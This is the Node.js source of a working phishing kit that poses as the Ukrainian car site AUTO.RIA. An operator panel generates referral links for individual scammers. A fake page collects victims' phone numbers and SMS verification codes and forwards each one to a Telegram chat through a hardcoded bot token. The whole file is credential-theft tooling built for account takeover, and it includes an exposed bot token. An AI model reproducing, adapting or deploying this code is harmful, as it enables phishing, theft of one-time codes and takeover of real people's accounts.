const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
const port = process.env.PORT || 3000;

// === TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// === ХРАНИЛИЩЕ ===
const refData = new Map(); // refId → { nick, phone }

// Генерация ref
const genRef = () => crypto.randomBytes(3).toString('hex');

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

// === Панель: /panel ===
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// === Создать реферальную ссылку ===
app.post('/api/create-ref', (req, res) => {
    const { nick } = req.body;
    if (!nick?.trim()) return res.status(400).json({ error: 'Введіть нік' });

    const cleanNick = nick.trim().replace(/^@/, '');
    const refId = genRef();
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const refLink = `${baseUrl}?ref=${refId}`;

    refData.set(refId, { nick: cleanNick });

    res.json({ refLink, nick: cleanNick });
});

// === Получение данных (номер / код) ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, ref } = req.body;
    let message = '';
    let nick = 'невідомий';

    // Получаем ник по ref
    if (ref && refData.has(ref)) {
        nick = refData.get(ref).nick;
        if (step === 'phone' && phone) {
            const clean = phone.replace(/\D/g, '');
            const formatted = clean.startsWith('380') ? `+${clean}` : phone;
            refData.get(ref).phone = formatted; // сохраняем номер
        }
    }

    if (step === 'phone' && phone) {
        const clean = phone.replace(/\D/g, '');
        const formatted = clean.startsWith('380') ? `+${clean}` : phone;

        message = `
*AUTO\\.RIA*  
*Номер:* \`${escape(formatted)}\`  
*Країна:* Україна  
*Позывной:* @${escape(nick)}
        `.trim();

    } else if (step === 'code' && code) {
        let associatedPhone = 'невідомий';
        if (ref && refData.has(ref) && refData.get(ref).phone) {
            associatedPhone = refData.get(ref).phone;
        }

        message = `
*SMS\\-код\\!*  
*Номер:* \`${escape(associatedPhone)}\`  
*Код:*  
\`\`\`
${escape(code)}
\`\`\`
*Реферер:* @${escape(nick)}
        `.trim();

    } else {
        return res.status(400).json({ success: false });
    }

    await sendToTelegram(message);
    res.json({ success: true });
});

// === Главная страница (AUTO.RIA) ===
app.get('/', (req, res) => {
    const { ref } = req.query;
    if (ref && refData.has(ref)) {
        // Встраиваем ref в страницу
        res.send(`
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>AUTO.RIA</title></head><body>
<script>
  window.REFERRER_ID = "${ref}";
</script>
<!-- ТУТ ТВОЯ СТРАНИЦА AUTO.RIA -->
<!-- Просто вставь свой HTML ниже -->
<h1>Введіть номер телефону</h1>
<input id="phone" placeholder="+380..." />
<button onclick="sendPhone()">Надіслати</button>

<script>
async function sendPhone() {
  const phone = document.getElementById('phone').value;
  await fetch('/api/send-data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ step: 'phone', phone, ref: window.REFERRER_ID })
  });
}
</script>
</body></html>
        `.trim());
    } else {
        res.redirect('/panel');
    }
});

// === Екранування ===
const escape = (text) => text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

async function sendToTelegram(message) {
    try {
        await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'MarkdownV2'
            })
        });
    } catch (err) {
        console.error('Telegram error:', err);
    }
}

app.listen(port, () => {
    console.log(`Панель: http://localhost:${port}/panel`);
});
